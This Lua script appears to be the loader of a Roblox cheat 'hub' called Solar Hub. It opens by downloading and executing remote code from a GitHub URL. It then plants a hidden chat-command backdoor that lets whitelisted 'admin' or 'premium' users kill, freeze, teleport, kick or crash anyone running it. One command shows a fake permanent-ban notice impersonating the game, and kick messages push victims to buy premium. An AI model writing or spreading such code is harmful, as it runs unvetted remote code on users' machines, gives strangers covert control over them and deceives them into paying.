local whitelisted = loadstring(game:HttpGet("https://raw.githubusercontent.com/xurel7/whitelist/main/whitelisted.lua"))()
if not whitelisted then return end

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer

local prefix = "/"
local premium = "⭐"
local admin = "👑"

local currentPos
local frozen

local function CheckRank(id)
    for i, v in next, whitelisted do
        if i ~= id then continue end
        return v
    end
end

local function AddTag(char,rank)
    local head = char:WaitForChild("Head")
    local plr = Players[char.Name]
    if not plr then return end
    
    local nameTag = head:FindFirstChild("Nametag")

    local nametext = nameTag["TextLabel"]
    local shadow = nametext["Shadow"]

    nametext.Text = "["..rank.."] "..plr.Name
    shadow.Text = "["..rank.."] "..plr.Name
end

local function Update(plr, char)
    local a = CheckRank(plr.UserId)
    if not a then return end
    local rank
    if string.find(a, "admin") then rank = "admin" end if string.find(a, "premium") then rank = "premium" end
    if not rank then return end
    if rank == "admin" then
        AddTag(char,admin)
    else
        AddTag(char,premium)
    end
end

for i, v in ipairs(Players:GetPlayers()) do
    local char = v.Character or v.CharacterAdded:Wait()
    if char then
        Update(v, char)
    end

    v.CharacterAdded:Connect(function(c)
        Update(v, c)
    end)
end

Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function(char)
        Update(plr, char)
    end)
end)

TextChatService.MessageReceived:Connect(function(messageData)
    local msg = string.lower(messageData.Text)
    local plr = messageData.TextSource
    local a = CheckRank(LocalPlayer.UserId)
    if a then
        if string.find(a, "admin") then return end
    end
    if plr == LocalPlayer then return end

    local a = CheckRank(plr.UserId)
    if not a then return end
    local Rank
    if string.find(a, "admin") then Rank = "admin" end if string.find(a, "premium") then Rank = "premium" end

    local b = CheckRank(LocalPlayer.UserId)
    if b then
    local PlrRank
    if string.find(b, "admin") then PlrRank = "admin" end if string.find(b, "premium") then PlrRank = "premium" end
        if Rank == "premium" then
            if PlrRank == "premium" or PlrRank == "admin" then return end
        elseif Rank == "admin" then
            if PlrRank == "admin" then return end
        end
    end

    local plr = Players[plr.Name]
    if not plr then return end

    local commands = {
        [prefix.."check"] = function()
            TextChatService.TextChannels.RBXGeneral:SendAsync("sola hub")
        end,

        [prefix.."kill"] = function()
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            if not char then return end
            local humanoid = char:WaitForChild("Humanoid")
            humanoid.Health = 0
        end,

        [prefix.."kick"] = function()
            LocalPlayer:Kick("[SOLAR HUB]: KICKED BY: "..plr.Name.."! BUY SOLAR HUB PREMIUM TO STOP BEING KICKED!")
        end,

        [prefix.."freeze"] = function()
            if frozen or frozen ~= nil then return end
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            if not char then return end
            local root = char:WaitForChild("HumanoidRootPart")
            root.Anchored = true
            frozen = true
        end,

        [prefix.."unfreeze"] = function()
            if not frozen or frozen == nil then return end
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            if not char then return end
            local root = char:WaitForChild("HumanoidRootPart")
            root.Anchored = false
            frozen = nil
        end,

        [prefix.."crash"] = function()
            LocalPlayer:Kick("[SOLAR HUB]: CRASHED BY "..plr.Name.."! BUY SOLAR HUB PREMIUM TO STOP BEING CRASHED!")
            task.wait(0.3)
            while true do end
        end,

        [prefix.."bring"] = function()
            if frozen or frozen ~= nil then return end
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            if not char then return end
            local root = char:WaitForChild("HumanoidRootPart")
            currentPos = root.CFrame
            task.wait()
            local otherChar = plr.Character or plr.CharacterAdded:Wait()
            if not otherChar then return end
            local otherRoot = otherChar:WaitForChild("HumanoidRootPart")
            root.CFrame = otherRoot.CFrame
        end,

        [prefix.."unbring"] = function()
            if frozen or frozen ~= nil then return end
            if not currentPos then return end
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            if not char then return end
            local root = char:WaitForChild("HumanoidRootPart")
            root.CFrame = currentPos
            task.wait()
            currentPos = nil
        end,

        [prefix.."ban"] = function()
            LocalPlayer:Kick("YOU HAVE BEEN PERMANENTLY BANNED FROM HOOPS LIFE! REASON: EXPLOITING.")
        end,

        [prefix.."grave"] = function()
            if frozen or frozen ~= nil then return end
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            if not char then return end
            local root = char:WaitForChild("HumanoidRootPart")
            local info = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
            local tween = TweenService:Create(root, info, {CFrame = root.CFrame * CFrame.new(0,-10,0)})
            tween:Play()
            tween.Completed:Wait()
            root.Anchored = true
        end,

        [prefix.."ungrave"] = function()
            if frozen or frozen ~= nil then return end
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            if not char then return end
            local root = char:WaitForChild("HumanoidRootPart")
            if root.Anchored ~= true then return end
            root.Anchored = false
            local info = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
            local tween = TweenService:Create(root, info, {CFrame = root.CFrame * CFrame.new(0,10,0)})
            tween:Play()
            tween.Completed:Wait()
        end,

        [prefix.."rejoin"] = function()
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        end,
    }

    for i, v in next, commands do
        if string.find(msg, i) then
            local succ,err = pcall(v)
            if not succ then
                warn(err)
            end
        end
    end
end)
